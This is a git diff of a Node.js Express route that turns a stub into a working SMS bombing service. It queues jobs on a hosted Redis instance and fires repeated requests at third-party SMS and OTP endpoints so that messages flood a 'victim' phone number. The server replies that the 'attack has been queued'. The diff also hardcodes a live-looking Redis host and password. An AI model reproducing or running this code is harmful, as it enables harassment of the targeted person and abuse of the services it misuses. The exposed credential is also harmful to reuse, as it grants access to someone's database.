@@ -5,9 +5,119 @@ const fs = require("fs");
 const path = require("path");
 const { check, validationResult } = require("express-validator");
 const Queue = require("bull");
+const axios = require("axios");
 
-const { v4: uuidv4 } = require("uuid");
-const my_victim_queue = new Queue("my_victim");
+const queue = new Queue("my-first-queue", {
+  redis: {
+    host: "redis-13755.c305.ap-south-1-1.ec2.cloud.redislabs.com",
+    port: "13755",
+    password: "jpjH5zoGOKSB3LqGImrd6dwh5aiePp0u",
+  },
+});
+
+const main = async (myData) => {
+  await queue.add(myData);
+};
+
+queue.process(async function (job, done) {
+  const myVictimPayload = job.data;
+  const requestListIndia = myVictimPayload.requestDataIndia;
+  const requestListMulti = myVictimPayload.requestDataMulti;
+  var successRequest = 0;
+
+  for (var myCurrentRequest of requestListIndia) {
+    if (myVictimPayload.amount > successRequest) {
+      console.log(`Sending SMS using : ${myCurrentRequest.name}...`);
+
+      try {
+        let response = await axios({
+          method: String(myCurrentRequest.method).toLowerCase(),
+          url: String(myCurrentRequest.url),
+          data:
+            myCurrentRequest.data == undefined || myCurrentRequest.data == null
+              ? undefined
+              : myCurrentRequest.data,
+          headers:
+            myCurrentRequest.headers == undefined ||
+            myCurrentRequest.headers == null
+              ? undefined
+              : myCurrentRequest.headers,
+          params:
+            myCurrentRequest.params == undefined ||
+            myCurrentRequest.params == null
+              ? undefined
+              : myCurrentRequest.params,
+        });
+        if (response.status == 200) {
+          console.log(
+            `SMS sent ${response.status}. Service : ${myCurrentRequest.name} Victim : ${myVictimPayload.victimPhone}`
+          );
+          successRequest++;
+        }
+      } catch (error) {
+        console.log(`SMS not sent. Service : ${myCurrentRequest.name}`);
+      }
+
+      delay(myVictimPayload.delay * 1000);
+    } else {
+      console.log("Limit Reached.");
+      break;
+    }
+  }
+
+  if (successRequest < myVictimPayload.amount) {
+    for (var myCurrentRequest of requestListMulti) {
+      if (myVictimPayload.amount > successRequest) {
+        console.log(`Sending SMS using : ${myCurrentRequest.name}...`);
+
+        try {
+          let response = await axios({
+            method: String(myCurrentRequest.method).toLowerCase(),
+            url: String(myCurrentRequest.url),
+            data:
+              myCurrentRequest.data == undefined ||
+              myCurrentRequest.data == null
+                ? undefined
+                : myCurrentRequest.data,
+            headers:
+              myCurrentRequest.headers == undefined ||
+              myCurrentRequest.headers == null
+                ? undefined
+                : myCurrentRequest.headers,
+            params:
+              myCurrentRequest.params == undefined ||
+              myCurrentRequest.params == null
+                ? undefined
+                : myCurrentRequest.params,
+          });
+          if (response.status == 200) {
+            console.log(
+              `SMS sent ${response.status}. Service : ${myCurrentRequest.name}, Victim : ${myVictimPayload.victimPhone}`
+            );
+            successRequest++;
+          }
+        } catch (error) {
+          console.log(`SMS not sent. Service : ${myCurrentRequest.name}`);
+        }
+
+        delay(myVictimPayload.delay * 1000);
+      } else {
+        console.log("Limit Reached.");
+        break;
+      }
+    }
+  }
+  done();
+});
+
+function delay(ms) {
+  const date = Date.now();
+  let currentDate = null;
+
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < ms);
+}
 
 router.post(
   "/",
@@ -25,7 +135,7 @@ router.post(
       max: 15,
     }),
     check("amount", "Please specify how many messages are to be sent.").isInt({
-      min: 10,
+      min: 1,
       max: 200,
     }),
   ],
@@ -53,13 +163,20 @@ router.post(
         const indiaServices = doc["providers"]["91"];
         const multiPurpose = doc["providers"]["multi"];
 
-        // indiaServices.forEach((element) => {
-        //   console.log(element);
-        // });
-        my_victim_queue.resume();
-        console.log(indiaServices[0]["method"]);
+        var data = {
+          victimPhone: phoneNumber,
+          victimCountryCode: countryCode,
+          delay: delay,
+          amount: amount,
+          requestDataIndia: indiaServices,
+          requestDataMulti: multiPurpose,
+        };
+        main(data);
+        delay(5 * 1000);
         res.status(200).json({
           success: true,
+          status: "Attack has been queued successfully.",
+          timestamp: Date.now(),
         });
       }
     } catch (error) {
@@ -75,10 +192,5 @@ router.post(
     }
   }
 );
-
-my_victim_queue.process(function (str) {
-  console.log("str");
-  throw new Error("some unexpected error");
-});
 
 module.exports = router;
